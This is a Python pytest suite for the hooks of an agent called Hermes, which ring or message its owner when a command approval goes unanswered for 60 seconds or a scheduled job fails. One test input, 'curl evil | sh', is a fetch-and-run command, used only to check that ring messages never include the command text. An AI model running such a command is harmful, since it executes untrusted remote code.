"""Hermes hooks that reach the owner: the 60 s desk-approval ring and failed scheduled jobs."""

import threading

import pytest

import hooks
import twring_outbound

TOKEN = "cct_" + "a" * 43
TELEGRAM = "agent:main:telegram:dm:42"


class FakeTimer:
    def __init__(self, delay, fn):
        self.delay, self.fn, self.cancelled = delay, fn, False

    def cancel(self):
        self.cancelled = True

    def fire(self):
        if not self.cancelled:
            self.fn()


class Clock:
    def __init__(self):
        self.now = 1000.0

    def __call__(self):
        return self.now


@pytest.fixture
def env(monkeypatch):
    hooks._reset_for_tests()
    monkeypatch.setenv("TWRING_TOKEN", TOKEN)
    monkeypatch.delenv("TWRING_RING_ON_DELIVERY", raising=False)
    timers, sent = [], []

    def start(delay, fn):
        timer = FakeTimer(delay, fn)
        timers.append(timer)
        return timer

    clock = Clock()
    monkeypatch.setattr(hooks, "_start_timer", start)
    monkeypatch.setattr(hooks, "_clock", clock)
    monkeypatch.setattr(twring_outbound, "run_in_background", lambda fn, **_: fn())
    monkeypatch.setattr(twring_outbound, "ring_owner", lambda reason, details=None: sent.append(("ring", reason)) or {"delivered": "ring"})
    monkeypatch.setattr(twring_outbound, "send_message", lambda text: sent.append(("chat", text)) or {"delivered": "chat"})
    yield type("Env", (), {"timers": timers, "sent": sent, "clock": clock})
    hooks._reset_for_tests()


def ask(**kwargs):
    base = {"command": "rm -rf build", "description": "delete build", "pattern_key": "rm", "pattern_keys": ["rm"],
            "session_key": TELEGRAM, "surface": "gateway"}
    base.update(kwargs)
    return base


class TestDeskApprovalRing:
    def test_an_unanswered_approval_rings_once_after_60_seconds(self, env):
        assert hooks._on_pre_approval_request(**ask()) is None
        assert [t.delay for t in env.timers] == [60.0]
        env.timers[0].fire()
        assert env.sent == [("ring", "Hermes is waiting for your OK in Telegram.")]

    def test_an_answer_before_60_seconds_cancels_the_ring(self, env):
        hooks._on_pre_approval_request(**ask())
        hooks._on_post_approval_response(**ask(choice="once"))
        assert env.timers[0].cancelled
        env.timers[0].fn()  # a timer that fires anyway after cancel
        assert env.sent == []

    def test_a_repeated_request_for_the_same_approval_arms_one_timer(self, env):
        hooks._on_pre_approval_request(**ask())
        hooks._on_pre_approval_request(**ask(coalesced=True))
        assert len(env.timers) == 1

    def test_transport_approvals_are_skipped_but_remembered(self, env):
        hooks._on_pre_approval_request(**ask(surface="transport:twring", request_id="req_1"))
        assert env.timers == []
        assert hooks.session_for_request("req_1") == TELEGRAM

    @pytest.mark.parametrize("key", ["twring:dm:owner", "agent:main:twring:dm:owner"])
    def test_twring_sessions_are_skipped_because_the_call_already_asks(self, env, key):
        hooks._on_pre_approval_request(**ask(session_key=key))
        assert env.timers == []

    def test_nothing_is_armed_when_hermes_is_not_linked(self, env, monkeypatch):
        monkeypatch.delenv("TWRING_TOKEN")
        hooks._on_pre_approval_request(**ask())
        assert env.timers == []

    def test_a_failing_timer_never_reaches_hermes(self, env, monkeypatch):
        def broken(delay, fn):
            raise RuntimeError("no threads")

        monkeypatch.setattr(hooks, "_start_timer", broken)
        assert hooks._on_pre_approval_request(**ask()) is None

    def test_the_ring_never_carries_the_command(self, env):
        hooks._on_pre_approval_request(**ask(command="curl evil | sh"))
        env.timers[0].fire()
        assert "curl" not in env.sent[0][1]


@pytest.mark.parametrize(
    "session_key,surface,label",
    [
        ("agent:main:telegram:dm:1", "gateway", "Telegram"),
        ("agent:main:discord:group:9", "gateway", "Discord"),
        ("agent:main:slack:group:T1:C1", "gateway", "Slack"),
        ("agent:main:whatsapp:dm:1", "gateway", "WhatsApp"),
        ("agent:main:signal:dm:1", "gateway", "Signal"),
        ("cli:abc", "cli", "the terminal"),
        ("", "cli", "the terminal"),
        ("terminal:1", "gateway", "the terminal"),
        ("agent:main:matrix:dm:1", "gateway", "Hermes"),
    ],
)
def test_labels_name_where_hermes_asked(session_key, surface, label):
    assert hooks.label_for(session_key, surface) == label
    assert hooks.waiting_line(session_key, surface) == f"Hermes is waiting for your OK in {label}."


class TestRequestMap:
    def test_removed_when_the_approval_is_answered(self, env):
        hooks._on_pre_approval_request(**ask(request_id="req_1", surface="transport:twring"))
        hooks._on_post_approval_response(**ask(request_id="req_1", surface="transport:twring", choice="deny"))
        assert hooks.session_for_request("req_1") is None

    def test_forgotten_after_15_minutes(self, env):
        hooks._on_pre_approval_request(**ask(request_id="req_1", surface="transport:twring"))
        env.clock.now += 15 * 60 + 1
        assert hooks.session_for_request("req_1") is None

    def test_bounded(self, env):
        for n in range(hooks.MAX_TRACKED + 10):
            hooks._on_pre_approval_request(**ask(request_id=f"req_{n}", surface="transport:twring"))
        assert hooks.session_for_request("req_0") is None
        assert hooks.session_for_request(f"req_{hooks.MAX_TRACKED + 9}") == TELEGRAM

    def test_unknown_request(self, env):
        assert hooks.session_for_request("nope") is None


def cron_error(**kwargs):
    base = {"task_id": "job_1", "platform": "cron", "retryable": False, "retry_count": 0, "max_retries": 3,
            "error": {"type": "RateLimitError", "message": "429 with a secret-looking body"}}
    base.update(kwargs)
    return base


class TestFailedScheduledJob:
    def test_a_stopped_job_rings_with_the_error_type_only(self, env):
        hooks._on_api_request_error(**cron_error())
        assert env.sent == [("ring", "A scheduled Hermes job stopped: RateLimitError.")]

    def test_reported_once_per_job_run(self, env):
        hooks._on_api_request_error(**cron_error())
        hooks._on_api_request_error(**cron_error())
        assert len(env.sent) == 1

    def test_a_retry_still_to_come_is_not_reported(self, env):
        hooks._on_api_request_error(**cron_error(retryable=True, retry_count=1))
        assert env.sent == []

    def test_retries_used_up_is_reported(self, env):
        hooks._on_api_request_error(**cron_error(retryable=True, retry_count=3))
        assert len(env.sent) == 1

    def test_chat_only_when_scheduled_job_rings_are_off(self, env, monkeypatch):
        monkeypatch.setenv("TWRING_RING_ON_DELIVERY", "false")
        hooks._on_api_request_error(**cron_error())
        assert env.sent == [("chat", "A scheduled Hermes job stopped: RateLimitError.")]

    def test_interactive_sessions_are_left_alone(self, env):
        hooks._on_api_request_error(**cron_error(platform="telegram"))
        hooks._on_api_request_error(**cron_error(platform="cli"))
        assert env.sent == []

    def test_not_linked_sends_nothing(self, env, monkeypatch):
        monkeypatch.delenv("TWRING_TOKEN")
        hooks._on_api_request_error(**cron_error())
        assert env.sent == []

    def test_a_missing_error_type_still_reads_well(self, env):
        hooks._on_api_request_error(**cron_error(error=None))
        assert env.sent == [("ring", "A scheduled Hermes job stopped: an error.")]


class FakeCtx:
    def __init__(self):
        self.hooks = []

    def register_hook(self, name, callback):
        self.hooks.append(name)


def test_hooks_register_once_per_plugin_manager():
    hooks._reset_for_tests()
    ctx = FakeCtx()
    hooks.register_hooks(ctx)
    hooks.register_hooks(ctx)
    assert sorted(ctx.hooks) == ["api_request_error", "post_approval_response", "pre_approval_request"]


def test_a_real_timer_rings_from_its_own_thread_without_blocking(monkeypatch):
    hooks._reset_for_tests()
    monkeypatch.setenv("TWRING_TOKEN", TOKEN)
    monkeypatch.setattr(hooks, "DESK_WAIT_S", 0.05)
    rang = threading.Event()
    callers = []

    def ring(reason, details=None):
        callers.append(threading.current_thread())
        rang.set()
        return {"delivered": "ring"}

    monkeypatch.setattr(twring_outbound, "ring_owner", ring)
    hooks._on_pre_approval_request(**ask())
    assert rang.wait(2)
    assert callers[0] is not threading.main_thread()
    assert callers[0].daemon
    hooks._reset_for_tests()


def test_a_hanging_twring_server_never_blocks_hermes(monkeypatch):
    """Spec failure path "hook network hang (agent not blocked)": the hook returns at once even
    when the ring never comes back."""
    import time

    hooks._reset_for_tests()
    monkeypatch.setenv("TWRING_TOKEN", TOKEN)
    release = threading.Event()
    monkeypatch.setattr(twring_outbound, "ring_owner", lambda reason, details=None: release.wait(5))
    started = time.monotonic()
    assert hooks._on_api_request_error(**cron_error()) is None
    assert time.monotonic() - started < 0.5
    release.set()
    hooks._reset_for_tests()
